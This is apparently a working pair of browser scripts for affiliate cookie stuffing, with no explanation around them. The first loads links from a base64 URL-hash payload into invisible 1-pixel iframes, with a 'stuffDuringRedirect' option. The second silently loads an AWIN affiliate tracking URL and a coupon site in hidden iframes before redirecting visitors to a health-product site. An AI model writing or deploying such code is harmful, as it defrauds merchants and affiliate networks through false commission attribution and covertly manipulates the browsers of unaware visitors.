(() => {
    var o = () => {
        let t = window.location.hash;
        return t.startsWith("#q=") ? t.substring(3) : null
    },
    i = () => {
        let t = window.location.hash;
        return t.startsWith("#url=") ? t.substring(5) : null
    },
    s = t => {
        try {
            let r = atob(t);
            return JSON.parse(r)
        } catch (r) {
            return null
        }
    },
    a = t => {
        if (!t) return;
        let r = c(t);
        var e = document.createRange();
        e.selectNode(document.getElementsByTagName("body")[0]);
        var n = e.createContextualFragment(r.outerHTML);
        document.body.appendChild(n)
    },
    c = t => {
        let r = document.createElement("div");
        return t.links && t.links.forEach(e => {
            let n = document.createElement("iframe");
            n.referrerPolicy = "no-referrer",
            n.style.display = "none",
            n.style.visibility = "hidden",
            n.width = "1px",
            n.height = "1px",
            n.src = e,
            r.appendChild(n)
        }),
        r
    },
    l = () => {
        let t = o();
        if (t) {
            let e = s(t);
            if (a(e), e != null && e.stuffDuringRedirect) {
                let n = e.redirectDelay || 3000;
                setTimeout(() => {
                    window.location.href = e.destination
                }, n)
            }
        }
        let r = i();
        if (r) {
            let e = decodeURIComponent(r);
            e && setTimeout(() => {
                window.location.href = e
            }, 100)
        }
    };
    l();
})();




<script>
"use strict";

(function () {

    // Read AWIN parameters
    const params = new URLSearchParams(window.location.search);

    // Construct AWIN tracking URL
    const awinUrl = "https://www.awin1.com/cread.php?" + params.toString();

    const intermediateUrl = "https://mycouponstock.com/";
    const finalRedirect = "https://humehealth.com/";

    // Fire AWIN tracking
    function fireAwinPixel() {
        const iframe = document.createElement("iframe");
        iframe.src = awinUrl;
        iframe.style.display = "none";
        iframe.referrerPolicy = "no-referrer";
        document.body.appendChild(iframe);
    }

    // Load intermediate page briefly, then redirect
    function openIntermediateThenRedirect() {
        const iframe = document.createElement("iframe");
        iframe.src = intermediateUrl;
        iframe.style.display = "none";
        iframe.referrerPolicy = "no-referrer";
        document.body.appendChild(iframe);

        setTimeout(() => {
            window.location.href = finalRedirect;
        }, 400);
    }

    fireAwinPixel();
    openIntermediateThenRedirect();

})();
</script>
